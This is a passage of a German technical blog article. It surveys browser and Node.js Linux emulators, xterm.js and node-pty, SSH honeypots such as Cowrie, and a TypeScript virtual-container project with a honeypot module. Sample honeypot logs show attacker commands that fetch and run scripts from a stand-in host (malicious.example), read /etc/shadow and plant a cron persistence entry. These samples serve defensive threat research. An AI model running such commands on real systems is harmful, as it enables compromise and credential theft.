- Für x86_64-Container: Bettet Bochs (einen x86-Emulator, kompiliert zu Wasm) + das Root-Dateisystem des Containers ein
- Für riscv64-Container: Bettet TinyEMU (schon wieder Bellard!) + das Root-Dateisystem des Containers ein
- Die resultierende `.wasm`-Datei bootet den Emulator, mountet das Container-Dateisystem und führt den Entrypoint des Containers aus

```bash
# Ubuntu 22.04 Container zu Wasm konvertieren
c2w ubuntu:22.04 out.wasm

# Ausführen
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Oder für die Browser-Nutzung bereitstellen
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

Das resultierende `.wasm` ist groß – ein minimales Ubuntu ist mehrere hundert MB – aber es ist vollständig in sich geschlossen. Du kannst jemandem ein `.wasm` mailen und er kann Ubuntu in seinem Browser ausführen. Dieser Satz sollte keinen Sinn ergeben, aber hier sind wir.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Emulator-Familien-Zusammenfassung

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Architektur** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietär) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Echter Kernel** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-Bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **npm-Paket** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI-Tool) |
| **Node.js-Nutzung** | ✅ | ❌ | ❌ | ❌ | ❌ (nur Browser) | via Wasmtime |
| **Browser-Nutzung** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/Instanz** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
| **Boot-Zeit** | 15–40s | 10–30s | 10–30s | 15–40s | 2–5s | 10–40s |
| **Open Source** | ✅ | ✅ | ✅ | ❌ | teilweise | ✅ |
| **Status** | ✅ sehr aktiv | ✅ stabil | ⚠️ archiviert | ✅ kommerziell | ✅ aktiv | ✅ aktiv |

Was aus dieser Tabelle heraussticht: `v86` ist das einzige, das ein npm-Paket ist, sowohl im Browser als auch in Node läuft und Open Source ist. Deshalb dominiert es die „JavaScript-Linux-Emulator"-Diskussion. Alles andere hat einen Haken – JSLinux hat keine API, jor1k ist archiviert, CheerpX kostet Geld, WebContainers ist nur für den Browser und Node-spezifisch, container2wasm erfordert einen Build-Schritt und ein CLI. Wenn du einfach nur „Linux in JavaScript booten" willst, ist `v86` fast immer der richtige Ausgangspunkt.

---

## Teil 3 – Terminal-Stacks: xterm.js und node-pty

Zwei Pakete tauchen ständig auf, wenn Leute Shell-ähnliche Erfahrungen bauen. Sie sind keine Sandboxes oder Emulatoren – sie sind die UI- und PTY-Infrastruktur – aber sie sind so angrenzend, dass ich sie schlecht weglassen könnte. Außerdem habe ich beide verwendet und sie sind wirklich gut.

### 3.1 `xterm.js` – der Terminal-Renderer

xterm.js ist ein Terminal-Emulator für den Browser. Er rendert einen Terminal-Bildschirm (VT100/xterm-Escape-Sequenzen) in einem `<canvas>`-Element, verarbeitet Tastatureingaben und bietet eine API zum Ein- und Ausleiten von Daten.

Verwendet von: VS Codes integriertem Terminal, Azure Cloud Shell, Proxmox VE, AWS CloudShell und vielen anderen.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Daten an das Terminal senden (als Text gerendert)
term.write("$ ");
term.onData(data => {
  // data sind Tastendrücke – an dein Backend senden
  socket.send(data);
});
socket.onmessage(msg => {
  // Ausgabe vom Backend – anzeigen
  term.write(msg.data);
});
```

xterm.js ist nur die Rendering-Schicht. Es führt keine Shell aus. Es interpretiert keine Befehle. Es ist ein Anzeige-Widget, das du mit jedem Backend verbinden kannst, das du willst. Viele Leute denken, xterm.js „macht das Terminal", aber es ist wirklich nur der Bildschirm – du musst es immer noch mit etwas verbinden, das tatsächlich Befehle ausführt.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` – PTY-Erzeugung

`node-pty` erzeugt ein Pseudoterminal (PTY) in Node.js und gibt dir ein Lese-/Schreib-Handle darauf. In Verbindung mit xterm.js kannst du ein Browser-Terminal bauen, das mit einer echten Shell (bash, zsh, fish) auf dem Server spricht.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // An xterm.js im Browser per WebSocket senden
  ws.send(data);
});

ws.on("message", data => {
  // Tastendrücke vom Browser an die Shell weiterleiten
  shell.write(data);
});
```

Das ist das Standardmuster für Cloud-IDEs und Web-Terminals: xterm.js (Browser) ↔ WebSocket ↔ node-pty ↔ echte Bash. Keine Isolation. Die Shell läuft mit den vollen Berechtigungen des Node.js-Prozesses (oder des Benutzers, der sie ausführt).

**Gepflegt von**: Microsoft.  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Teil 4 – SSH-Honeypots

Honeypots sind dazu da, angegriffen zu werden. Das Ziel ist, echt genug auszusehen, dass Angreifer mit ihnen interagieren, während alles aufgezeichnet wird, was sie tun, für die Bedrohungsanalyse. SSH ist das primäre Ziel, weil es der am meisten angegriffene Dienst im Internet ist – wenn du Port 22 auf einer öffentlichen IP freigibst, wirst du innerhalb von Minuten automatisierte Scan-Versuche sehen. Probier es mal aus, es irgendwie erschreckend, wie schnell das passiert.

Die Qualität eines Honeypots wird an zwei Dingen gemessen: **Wiedergabetreue** (wie überzeugend er vorgibt, ein echtes System zu sein) und **Telemetrie** (wie viele nützliche Daten er erfasst). Diese stehen in Spannung. Ein Honeypot mit hoher Wiedergabetreue ist schwerer zu bauen und riskanter zu betreiben.

Dieser Abschnitt hat mich letztendlich dazu gebracht, das `HoneyPot`-Modul in `typescript-virtual-container` zu bauen, also habe ich hier einige Meinungen.

### 4.1 Cowrie – der Goldstandard

Cowrie ist ein Python-basierter Medium-to-High-Interaction-SSH- und Telnet-Honeypot. Er ist der am weitesten verbreitete SSH-Honeypot in der Forschungs- und Sicherheits-Community.

Architektur:
- **Protokollschicht**: echte SSH-Protokollimplementierung (Twisted Conch), also bekommen Angreifer echte Handshakes, echten Schlüsselaustausch, echte Authentifizierung
- **Shell-Schicht**: ein gefälschtes Dateisystem (ähnlich Debian 5.0) und ein partieller Shell-Interpreter, der auf gängige Befehle reagiert
- **Proxy-Modus**: kann an ein echtes System dahinter weiterleiten (High-Interaction-Modus) und zeichnet alles auf, was durchfließt
- **LLM-Modus** (neue Ergänzung): verwendet ein Sprachmodell, um dynamische Antworten auf Befehle zu generieren, die es nicht zu verarbeiten weiß – ja, Cowrie hat jetzt einen KI-Modus. Verrückte Zeiten.

```python
# Was Cowrie erfasst
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie speichert heruntergeladene Dateien (via wget/curl/SFTP/SCP) zur Malware-Analyse. Es integriert sich mit Splunk, Elasticsearch und anderen SIEM-Plattformen.

**Wiedergabetreue**: mittel-hoch. Überzeugend genug, um automatisierte Bots zu täuschen (was 99% der SSH-Angreifer sind – die meisten sind nur dumme Skripte, die `root`/`password` versuchen). Anspruchsvolle Menschen können es jedoch fingerabtasten, normalerweise ziemlich schnell.

**Sprache**: Python (Twisted)  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo – Cowries Vorgänger

Kippo ist der ursprüngliche Medium-Interaction-SSH-Honeypot, auf dem Cowrie basierte. Gleiche Grundidee: echtes SSH-Protokoll, gefälschtes Dateisystem, partielle Shell. Cowrie hat es inzwischen vollständig abgelöst – Kippo ist archiviert und niemand sollte es 2026 mehr betreiben. Hier nur aus historischer Vollständigkeit erwähnt, falls du es in alten Blogbeiträgen und Sicherheitspapieren siehst.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) – archiviert

---

### 4.3 endlessh – die SSH-Tarpit

endlessh ist ein degenerierter Honeypot: Es hält SSH-Verbindungen offen, indem es langsam Banner-Daten mit 1 Byte pro Sekunde (oder langsamer) ausgibt. Ein SSH-Client, der sich damit verbindet, hängt auf unbestimmte Zeit – er wird nie zur Authentifizierung gelangen, weil der Server das Senden des Banners nie beendet.

Das Ziel ist nicht Bedrohungsanalyse, sondern reine Ressourcenverweigerung: Die Scanner-Threads von Angreifern zu binden, damit sie echte Ziele nicht so schnell treffen können. Es ist ehrlich gesagt irgendwie böse im besten Sinne. Du lernst nichts vom Angreifer – du verschwendest nur seine Zeit. Da ist etwas zutiefst Befriedigendes dran.

```c
// endlesshs gesamtes Protokollverhalten:
// Senden: "SSH-2.0-OpenSSH_" dann langsam zufällige Zeichen anhängen
// Verbindung niemals schließen
// Angreifer-Scanner timeoutet nach N Sekunden
```

Es werden keine Befehle erfasst. Keine Authentifizierung wird getestet. Nur Verbindungszeit.

**Geschrieben in**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame – der „lass alle rein"-Honeypot

sshesame akzeptiert jede SSH-Verbindung (beliebiger Benutzername, beliebiges Passwort, beliebiger Schlüssel) und protokolliert alles. Es ist ein Zero-Interaction-Honeypot: Es reagiert nicht auf Befehle, lässt Angreifer einfach „rein" und zeichnet jeden Tastendruck auf, den sie eingeben.

```
2024-01-15 03:22:11 Connection from 45.33.32.156
  Username: root, Password: password123 -- accepted
  Commands typed:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Disconnected after 47s
```

Nützlich für die Erfassung von Zugangsdaten: Du sammelst schnell die Benutzernamen und Passwörter, die Bots ausprobieren, was dir sagt, welche Standard-Zugangsdaten derzeit aktiv brute-forciert werden. Spoiler: Es ist immer `root`/`password`, `admin`/`admin` und `root`/`123456`. Jedes Mal.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird – Docker-basiertes Honeypot-Framework

`lyrebird/honeypot-base` ist ein Docker-Basis-Image zum Bauen von Netzwerkdienst-Honeypots. Es ist nicht spezifisch ein SSH-Honeypot – es ist ein Framework zum Bauen von Honeypots für jedes Protokoll.

Das Basis-Image bietet ein Logging-Framework, ein Plugin-System für Protokolle und Docker-Compose-Setups für Multi-Service-Honeypots. Du erweiterst es, um spezifische Dienste vorzutäuschen.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Einen SSH-Honeypot in Node.js bauen – der naive Weg und warum er scheitert

Vor `typescript-virtual-container` bedeutete das Bauen eines SSH-Honeypots in Node.js, die echte `ssh2`-Bibliothek mit manuellem Command-Faking zu kombinieren. Sehr mühsam, sehr unvollständig, aber... es ist irgendwie ein Initiationsritus:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Log the attempt
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Let everyone in
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Fake response
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Das „funktioniert" in dem Sinne, dass es Zugangsdaten und Befehle erfasst. Aber es ist offensichtlich gefälscht, sobald ein ausgefeilter Angreifer daran herumstochert. `uname -a`, das den richtigen String zurückgibt, aber `ls /etc` „command not found" zurückgibt, ist ein deutliches Zeichen. Das Dateisystem existiert nicht. Befehle verketten sich nicht. Pipes funktionieren nicht. Variablen werden nicht expandiert.

Ein erfahrener Angreifer wird deinen Honeypot in den ersten fünf Befehlen identifizieren. Automatisierte Skripte, die auf Cowrie-ähnliches Verhalten prüfen, werden es ebenfalls sofort erkennen. Das war scheinbar der Grund, der die Autorin von `typescript-virtual-container` dazu gebracht hat, etwas zu bauen, das Befehle tatsächlich interpretiert – mehr dazu in Teil 5.

---

### Honeypot-Familien-Zusammenfassung

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naives ssh2 |
|---|---|---|---|---|---|---|
| **Interaktionslevel** | mittel-hoch | mittel | null | null | variiert | niedrig |
| **Echtes SSH-Protokoll** | ✅ | ✅ | ❌ (Tarpit) | ✅ | variiert | ✅ |
| **Shell-Wiedergabetreue** | mittel | mittel | n/a | keine | variiert | minimal |
| **Erfasst Zugangsdaten** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Erfasst Befehle** | ✅ | ✅ | ❌ | ✅ | variiert | ✅ |
| **Erfasst Malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM-Integration** | ✅ nativ | ❌ | ❌ | ❌ | ❌ | manuell |
| **LLM-Antworten** | ✅ (neu) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Sprache** | Python | Python | C | Go | Docker | Node.js |
| **Node.js-nativ** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ✅ sehr aktiv | ⚠️ archiviert | ✅ aktiv | ✅ aktiv | ✅ aktiv | DIY |

Das Muster ist ziemlich klar: Je mehr Wiedergabetreue du willst, desto mehr Python musst du schreiben. Cowrie ist der klare Gewinner, wenn du es ernst meinst – es ist seit Jahren kampferprobt und erfasst weit mehr als nur Zugangsdaten. endlessh und sshesame sind eher lustige Nebenprojekte als ernsthafte Threat-Intelligence-Tools. Und der naive Node.js-Ansatz bringt dich vielleicht 20% der Strecke, bevor du an eine Wand stößt.

---

## Teil 5 – `typescript-virtual-container`: Was die Lücke füllt

OK, hier wird es interessant. Nachdem ich alle oben genannten Familien katalogisiert habe, wird das fehlende Quadrant ziemlich offensichtlich:

- JS-Sandboxes: isolieren Code, keine Shell, kein Dateisystem, kein SSH
- Linux-Emulatoren: echtes OS, echte Shell, echtes SSH... aber 150+ MB RAM, 30-Sekunden-Boot, und du musst deine eigene API auf serieller E/A aufbauen
- Honeypots: gefälschte Shell, keine programmatische API, Python/Go/C, nicht Node-nativ

Niemand hatte eine vollständige, programmatische, Node-native Linux-Umgebung mit echtem SSH, echten Berechtigungen, echtem virtuellem Netzwerk und einer typisierten TypeScript-API gebaut. Also hat sie es gebaut.

Kurze Vorstellung, da ich sie hier zum ersten Mal richtig erwähne: `typescript-virtual-container` wurde von [Chloé Rolzhausen](https://itsrealfortune.fr) gebaut, einer französischen Entwicklerin, die online als **Fortune** (oder ItsRealFortune) bekannt ist. Du findest sie auf ihrer [Website](https://itsrealfortune.fr) und auf [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//). Das gesamte Projekt – 56.000 Zeilen TypeScript, 247 Dateien, 170 Befehle – war eine Solo-Leistung einer einzigen Person. Ich werde sie für den Rest des Artikels Fortune nennen. Und ja, es ist irgendwie verrückt. Schau dir ihre Sachen an!

### Was es tatsächlich ist

`typescript-virtual-container` ist ein **Linux-Umgebungs-Simulator**, geschrieben in reinem TypeScript. Kein Wasm. Keine nativen Addons. Kein Kernel. ~56.000 Zeilen Quellcode in 247 TypeScript-Dateien.

Die entscheidende Erkenntnis: Du brauchst keinen CPU-Emulator, damit `ls /etc | grep passwd` funktioniert. Du brauchst:
1. Einen Baum von Knoten im Speicher, die auf Pfadoperationen reagieren
2. Ein POSIX-Berechtigungsmodell, das bei jedem Zugriff durchgesetzt wird
3. Einen Shell-Parser, der Pipes, Umleitungen, Subshells und Variablenexpansion versteht
4. ~170 Befehlsimplementierungen (Funktionen, keine Binaries)
5. Ein Benutzer- und Gruppenverwaltungssystem
6. Etwas, um das alles über SSH zugänglich zu machen

All das ist in reinem TypeScript ohne Kernel-Beteiligung erreichbar.

### Das VirtualFileSystem

Das VFS ist ein speicherinterner Baum von typisierten Knoten – keine Festplatten-E/A, es sei denn, du aktivierst explizit den `"fs"`-Persistenzmodus:

```ts
// Simplified internal representation
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // lazy-loaded placeholder
```

Jede Pfadoperation durchläuft `normalizePath` (löst `.`, `..`, Symlinks auf) und `enforceAccess` (prüft Lese-/Schreib-/Ausführungsberechtigung gegen die anfragende uid/gid). `chmod`, `chown`, Sticky Bits und setuid sind alle implementiert und werden tatsächlich durchgesetzt. Wenn ein Prozess, der als uid 1000 läuft, versucht, eine Datei zu lesen, die root mit Modus 0600 gehört, bekommt er EACCES – kein gefakter EACCES, ein echter JavaScript `Error`, der von der Berechtigungsprüfung ausgelöst wird. Dieser Teil ist ziemlich elegant, ehrlich gesagt.

Das VFS serialisiert zu:
- `.vfsb` – ein kompaktes binäres Format (benutzerdefiniert, mit fflate-Komprimierung) – das ist die Standardeinstellung
- JSON-Snapshot – menschenlesbar, gut zum Debuggen
- TAR-Archiv – Import/Export mit echtem tar-Format, sodass du `tar -xf` etwas ausführen kannst und das VFS einfach... diese Dateien hat
- SquashFS-Image – schreibgeschützter Import

Im `"fs"`-Persistenzmodus führt es ein Write-Ahead-Journal (WAL) zur Crash-Wiederherstellung – Schreibvorgänge gehen zuerst ins Journal, dann beim Flush in den Snapshot. Wenn Node mitten in einer Operation abstürzt, kannst du mit dem Journal den letzten vollständigen Zustand rekonstruieren.

Es gibt auch eine `FileCache`-Schicht, die Festplatten-E/A-Latenz simuliert. Du konfigurierst Profile wie `NVME_DISK_IO` oder `HDD_DISK_IO` und das VFS verzögert Dateioperationen künstlich, um realistische Zeitvorgaben zu erreichen. Was irgendwie lustig ist – Software, die sich absichtlich verlangsamt, um Hardware zu simulieren – aber tatsächlich sehr nützlich für Benchmarking.

### Der Shell-Interpreter

Der Shell-Parser produziert einen typisierten AST:

```ts
// "ls /etc | grep root && echo done" parses to:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Der Executor durchläuft diesen AST:
- Für eine Pipeline erstellt er eine Kette von `{ stdin, stdout, stderr }`-Streams und führt jeden Befehl mit gepipe-ter E/A aus
- Für logische Operatoren (`&&`, `||`) prüft er `$?` nach der linken Seite, bevor er die rechte ausführt
- Für Subshells (`$(...)`, `` ` ` ``) forked er den Ausführungskontext
- Für Umleitungen (`>file`, `>>file`, `2>&1`, `<file`) richtet er die Stream-Verdrahtung vor der Ausführung ein
- Für Hintergrundjobs (`cmd &`) führt er aus, ohne auf den Abschluss zu warten
- Für Variablen expandiert er `$VAR`, `${VAR:-default}`, `${#VAR}` und arithmetische `$((expr))`
- Für Brace-Expansion (`{a,b,c}`, `{1..5}`) generiert er die vollständige Expansionsliste vor der Ausführung

All dies ist echtes POSIX-Shell-Verhalten. Der Parser verarbeitet Heredocs, Prozesssubstitution, Globbing (`*`, `?`, `[abc]`) und Anführungszeichen (einfache Anführungszeichen, doppelte Anführungszeichen mit Interpolation, Backslash-Escaping). Es ist nicht perfekt – Randfälle existieren – aber es geht weit über das hinaus, was man von einem TypeScript-Projekt erwarten würde.

### ~170 eingebaute Befehle

Befehle sind TypeScript-Funktionen, die in einer Befehlsregistrierung registriert sind. Sie erhalten einen `CommandContext` mit stdin/stdout/stderr-Streams, dem VFS, der Benutzersitzung, der Shell-Umgebung und Zugriff auf Submodule.

170 Unix-Befehlsimplementierungen zu schreiben ist... eine Menge. Einige sind trivial (`echo`, `true`, `false`), einige sind überraschend komplex (`awk`, `find`, `tar`). Wie vollständiges POSIX `awk`? In TypeScript? Das ist ehrlich verrückt. Hier eine Auswahl dessen, was enthalten ist:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (client-side, connecting out),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (full interactive editor), vim (basic), vi (basic),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulated), systemctl (stubbed), journalctl (stubbed),
...and ~130 more
```

Die „Stubs" (git, python3, node) reagieren realistisch auf häufige Aufrufe – `python3 --version` gibt eine glaubwürdige Versionszeichenkette zurück, `git status` zeigt einen gefälschten Repository-Status – ohne echte Arbeit zu leisten. Für einen Honeypot sind diese tatsächlich nützlicher als die echten Dinger, weil sie dir erlauben zu beobachten, was Angreifer auszuführen versuchen, ohne tatsächlich etwas Schädliches auszuführen.

### Der SSH-Server

Die SSH-Schicht verwendet das echte `ssh2`-npm-Paket – echtes SSH-Protokoll, echter Schlüsselaustausch, echte Verschlüsselung. `SSHMimic` kapselt es:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Real SSH: ssh -p 2222 root@localhost
// Real SFTP: sftp -P 2222 root@localhost
// Real SCP: scp -P 2222 file root@localhost:/tmp/
```

Die `shellProperties` bestimmen, was `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` und `/etc/os-release` melden. Du kannst jede Linux-Distribution und Kernel-Version überzeugend impersonaten – für einen echten SSH-Client gibt es buchstäblich keine Möglichkeit, den Unterschied zu erkennen.

### Das HoneyPot-Modul

Weil der Shell-Interpreter echt und der SSH-Server echt ist, werden Angreiferbefehle tatsächlich in der virtuellen Umgebung ausgeführt. Von Angreifern ausgelöste `wget`-Anfragen werden mit Ziel-URLs protokolliert. Von Angreifern erstellte Dateien werden im VFS gespeichert. Versuche der Angreifer, Berechtigungen zu eskalieren, erzeugen realistische Fehler.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// After a session, diff the filesystem
const before = shell.vfs.toSnapshot();
// ... attacker session ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Das unterscheidet sich qualitativ von Cowrie. Cowries gefälschtes Dateisystem kann auf `ls` reagieren, aber nicht tatsächlich verfolgen, welche Dateien ein Angreifer erstellt hat und welche Änderungen er als strukturierten Diff vorgenommen hat. `typescript-virtual-container` kann das, weil das VFS eine lebende Datenstruktur ist – jeder Schreibvorgang wird verfolgt. Dieser Cron-Eintrag, den der Angreifer gerade hinzugefügt hat? Er ist im Diff. Dieser `.hidden`-Ordner? Im Diff. Ziemlich nützlich für Malware-Analyse.

### Der virtuelle Netzwerk-Stack

Das ist wahrscheinlich der beeindruckendste Teil des gesamten Projekts, und er hat kein Äquivalent in irgendeinem anderen Projekt in diesem Bereich. Ein vollständiger L2/L3-virtueller Netzwerk-Stack mit VPN-Unterstützung, geschrieben in reinem TypeScript, ohne echte Netzwerkadapter. Das ist wirklich verrückt.

`VirtualNetworkManager` gibt jeder `VirtualShell`-Instanz virtuelle Netzwerkschnittstellen mit konfigurierbaren IP-Adressen, Routing-Tabellen und einer Software-Firewall (iptables-artige Regeln mit Conntrack und NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` zeigen alle den virtuellen Netzwerkstatus an.

`VirtualSwitch` (benannt Baie – vom französischen Wort für Server-Rack-Bucht, „baie informatique") verbindet mehrere Shells in einem gemeinsamen Subnetz. Es implementiert:
- MAC-Learning und ARP
- IP-Routing zwischen Subnetzen
- NAT (Outbound-Masquerade)
- DNS (konfigurierbare Datensätze pro Subnetz)
- Lastverteilung (Round-Robin, Least-Connections)
- Traffic-Shaping: Latenz, Jitter (Gauß-Verteilung), Paketverlust, Burst-Verlust, Neuordnung, Duplikation
- Bandbreitenbegrenzung (Token-Bucket)
- MTU-Durchsetzung
- Verbindungsverfolgung (zustandsbehaftet, mit NEW/ESTABLISHED/TIME_WAIT-Zuständen)

```ts
const baie = new Baie("192.168.0.0/24");

// Three virtual machines on the same switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web can reach api, api can reach db, web cannot reach db directly
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Traffic shaping: simulate a flaky WAN link to the outside
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` erstellt verschlüsselte Tunnel zwischen Baie-Instanzen – du kannst ein Multi-Site-Netzwerk mit VPN-Interconnects zwischen Standorten simulieren.

`VirtualProxy` implementiert Port-Weiterleitung und einen SOCKS5-Proxy.

Nichts davon berührt einen echten Netzwerkadapter. Es ist alles TypeScript-Objekt-Routing. Der `ping`-Befehl „funktioniert", indem er durch den virtuellen Switch routet und simulierte ICMP-Antworten zurückgibt. `curl http://192.168.0.3/api` routet durch das virtuelle Netzwerk, trifft auf die simulierte HTTP-Antwort der api-Shell und gibt den Inhalt zurück. Es ist in der besten Weise durch und durch eine Schildkröten.

### Die `SandboxedShell`

Für die programmatische Nutzung, bei der du eine stärkere Isolation benötigst, führt `SandboxedShell` eine Shell-Sitzung in einem Node.js-Worker-Thread aus:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% of one core
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Die Isolation wird hier durch die VFS-Schicht (der Worker-Thread der Shell kann nur das virtuelle Dateisystem sehen, niemals das Host-Dateisystem) plus Node.js-Worker-Thread-Speicherisolation erzwungen. Das ist leichter als `isolated-vm`, aber besser geeignet für Shell-Level-Isolation als für JS-Level-Isolation.

### Ressourcenbegrenzung

Du kannst Pro-Shell-Ressourcenlimits konfigurieren, die sich darauf auswirken, was Systemüberwachungsbefehle melden:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Innerhalb dieser Shell zeigt `free -m` 512 MB Gesamt-RAM an. `nproc` gibt 2 zurück. `/proc/meminfo` zeigt die gedeckelten Werte. `htop` und `top` zeigen die gedeckelte CPU-Anzahl. Damit kannst du das Hardware-Profil der gefälschten Maschine präzise fingerabtasten.

### Drei Bereitstellungsmodi

```
Modus 1: SSH/SFTP-Server
  VirtualSshServer / VirtualSftpServer
  → Echtes SSH-Protokoll, echtes SFTP, echtes SCP
  → Anwendungsfall: Honeypots, Remote-Testumgebungen, Trainingslabore

Modus 2: Web-Shell (Browser)
  builds/fortune-nyx-v1.7.6-web.min.js (ESM-Bundle)
  → Läuft im Browser, VFS in IndexedDB gespeichert
  → Anwendungsfall: Interaktive Tutorials, eingebettete Terminals, Demos
  → Bonus: startxfce4 für einen vollständigen simulierten XFCE-Desktop ausführen

Modus 3: Eigenständiges CLI
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (einzelne Datei, keine Installation)
  → curl und ausführen, VFS im .vfs/-Verzeichnis speichern
  → Anwendungsfall: Schnelle Demos, lokale Experimente
```

### Die Polyfills – wie der Browser-Build ohne Wasm funktioniert

OK, das ist der Teil, den ich wirklich clever finde und den ich speziell hervorheben wollte.

